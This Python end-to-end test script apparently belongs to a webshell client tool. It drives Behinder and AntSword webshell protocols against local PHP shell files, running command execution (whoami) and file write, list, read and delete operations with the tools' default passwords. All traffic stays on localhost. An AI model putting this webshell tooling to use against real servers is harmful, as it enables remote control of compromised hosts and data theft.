"""E2E 联调：让 Behinder/AntSword 协议真的通过 HTTP 打一个真 PHP 解释器。

用法：python run_e2e.py <php.exe 路径>
流程：
  1) 启动 php.exe -S 127.0.0.1:<free port> -t <此目录>
  2) 用 BehinderProtocol / AntSwordProtocol 依次执行 sysinfo/exec/list/write/read/delete
  3) 全部通过则退出码 0；任一失败退出码 1
"""
from __future__ import annotations

import base64
import json
import os
import socket
import subprocess
import sys
import time
import urllib.request
from pathlib import Path

HERE = Path(__file__).resolve().parent
REPO = HERE.parent  # tools/clients/webshell/
sys.path.insert(0, str(REPO))

from protocols import Operation, get_protocol  # noqa: E402
from protocols.base import Protocol  # noqa: E402


def free_port() -> int:
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


def wait_port(port: int, timeout: float = 6.0) -> None:
    end = time.time() + timeout
    while time.time() < end:
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=0.2):
                return
        except OSError:
            time.sleep(0.1)
    raise RuntimeError(f"php -S 未在 {timeout}s 内起来于 127.0.0.1:{port}")


def http_post(url: str, body: bytes, headers: dict, timeout: float = 8.0) -> bytes:
    req = urllib.request.Request(url, data=body, method="POST", headers=headers)
    with urllib.request.urlopen(req, timeout=timeout) as resp:  # noqa: S310 本地
        return resp.read()


def round_trip(proto: Protocol, op: str, params: dict) -> dict:
    body, headers = proto.build_request(op, params)
    raw = http_post(proto.target, body, headers)
    return proto.parse_response(op, raw)


def run_suite(proto: Protocol, label: str) -> list[tuple[str, bool, str]]:
    """针对一个协议实例跑一整套 op；返回 (op, ok, detail) 列表。"""
    results: list[tuple[str, bool, str]] = []
    tmp_rel = f"_e2e_{label}.txt"
    tmp_abs = str((HERE / tmp_rel).as_posix())
    payload_bytes = f"hello-from-{label}\n".encode("utf-8")
    payload_b64 = base64.b64encode(payload_bytes).decode("ascii")

    def check(op: str, cond: bool, detail: str) -> None:
        results.append((op, cond, detail))

    # 1. sysinfo
    try:
        info = round_trip(proto, Operation.SYSINFO, {})
        check("sysinfo", "os" in info and "cwd" in info,
              f"os={info.get('os')} cwd={info.get('cwd')}")
    except Exception as error:  # noqa: BLE001
        check("sysinfo", False, f"异常：{error!r}")

    # 2. exec whoami
    try:
        data = round_trip(proto, Operation.EXEC, {"cmd": "whoami"})
        out = (data.get("output") or "").strip()
        check("exec", bool(out), f"whoami→{out!r}")
    except Exception as error:  # noqa: BLE001
        check("exec", False, f"异常：{error!r}")

    # 3. write
    try:
        data = round_trip(
            proto, Operation.WRITE,
            {"path": tmp_abs, "content": payload_b64},
        )
        check("write", data.get("written") == len(payload_bytes),
              f"written={data.get('written')} expected={len(payload_bytes)}")
    except Exception as error:  # noqa: BLE001
        check("write", False, f"异常：{error!r}")

    # 4. list
    try:
        data = round_trip(proto, Operation.LIST, {"path": str(HERE.as_posix())})
        names = [e["name"] for e in data.get("entries", [])]
        check("list", tmp_rel in names, f"entries 含 {tmp_rel}? names={names[:5]}...")
    except Exception as error:  # noqa: BLE001
        check("list", False, f"异常：{error!r}")

    # 5. read
    try:
        data = round_trip(proto, Operation.READ, {"path": tmp_abs})
        content = base64.b64decode(data.get("content", "") or "")
        check("read", content == payload_bytes,
              f"read {len(content)}B, 匹配 write 内容")
    except Exception as error:  # noqa: BLE001
        check("read", False, f"异常：{error!r}")

    # 6. delete
    try:
        data = round_trip(proto, Operation.DELETE, {"path": tmp_abs})
        check("delete", data.get("deleted") is True,
              f"deleted={data.get('deleted')}")
    except Exception as error:  # noqa: BLE001
        check("delete", False, f"异常：{error!r}")

    return results


def main() -> int:
    if len(sys.argv) < 2:
        print("用法：run_e2e.py <php.exe 路径>", file=sys.stderr)
        return 2
    php = sys.argv[1]
    port = free_port()
    env = dict(os.environ)
    # 让 php -S 别把大量请求日志刷屏
    cmd = [php, "-S", f"127.0.0.1:{port}", "-t", str(HERE)]
    print(f"[e2e] 启动 {cmd}")
    proc = subprocess.Popen(cmd, cwd=str(HERE), env=env,
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        wait_port(port)
        base = f"http://127.0.0.1:{port}"

        beh = get_protocol(
            "behinder",
            target=f"{base}/shell_behinder.php",
            password="rebeyond",
            payload_type="php",
        )
        ant = get_protocol(
            "antsword",
            target=f"{base}/shell_antsword.php",
            password="pass",
            payload_type="php",
            encoder="base64",
        )

        beh_results = run_suite(beh, "behinder")
        ant_results = run_suite(ant, "antsword")

        def dump(label: str, rs: list[tuple[str, bool, str]]) -> bool:
            print(f"\n=== {label} ===")
            all_ok = True
            for op, ok, detail in rs:
                mark = "PASS" if ok else "FAIL"
                if not ok:
                    all_ok = False
                print(f"  [{mark}] {op:8s} {detail}")
            return all_ok

        ok1 = dump("Behinder (AES-128-ECB)", beh_results)
        ok2 = dump("AntSword (base64 encoder)", ant_results)

        # 附加：AntSword raw encoder 也验证一次 sysinfo
        try:
            ant_raw = get_protocol(
                "antsword",
                target=f"{base}/shell_antsword.php",
                password="pass",
                payload_type="php",
                encoder="raw",
            )
            data = round_trip(ant_raw, Operation.SYSINFO, {})
            ok_raw = "os" in data and "cwd" in data
            print(f"\n=== AntSword (raw encoder) ===")
            print(f"  [{'PASS' if ok_raw else 'FAIL'}] sysinfo os={data.get('os')} cwd={data.get('cwd')}")
        except Exception as error:  # noqa: BLE001
            ok_raw = False
            print(f"\n=== AntSword (raw encoder) ===")
            print(f"  [FAIL] sysinfo 异常：{error!r}")

        return 0 if (ok1 and ok2 and ok_raw) else 1
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            proc.kill()


if __name__ == "__main__":
    raise SystemExit(main())
